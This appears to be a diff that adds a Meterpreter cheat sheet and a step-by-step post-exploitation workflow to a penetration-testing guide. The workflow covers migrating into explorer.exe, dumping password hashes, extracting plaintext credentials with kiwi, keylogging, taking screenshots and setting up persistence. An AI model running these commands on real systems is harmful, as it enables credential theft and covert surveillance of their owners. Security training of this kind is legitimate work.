@@ -1113,3 +1113,54 @@ run
 |incognito |load incognito |Token manipulation|
 |sniffer| load sniffer| Network sniffing|
 |stdapi| (loaded by default)| Core commands (filesystem, network)|
+
+
+## Meterpreter Cheat Sheet (Most Useful Commands)
+
+|Category| Command|
+|----|----|
+|System| sysinfo, getuid, ps, migrate|
+|File |ls, cd, upload, download, search|
+|Network| ipconfig, netstat, portfwd
+Privilege getsystem, hashdump, load| kiwi|
+|Stealth| keyscan_start, keyscan_dump, screenshot|
+|Persistence| run persistence|
+|Pivoting |background → route add → scan|
+
+
+## Real-World Meterpreter Workflow
+
+
+-- After gaining a session
+sessions -i 1
+
+- Check your privileges
+getuid
+sysinfo
+
+- List processes and migrate to a trusted one
+ps
+migrate 2528   # explorer.exe PID
+
+- Dump password hashes
+hashdump
+
+- Load Kiwi and get plaintext passwords
+load kiwi
+creds_all
+
+- Start keylogger
+keyscan_start
+
+- Wait a few minutes...
+keyscan_dump
+keyscan_stop
+
+- Take a screenshot
+screenshot
+
+- Background the session when done
+background
+
+
+
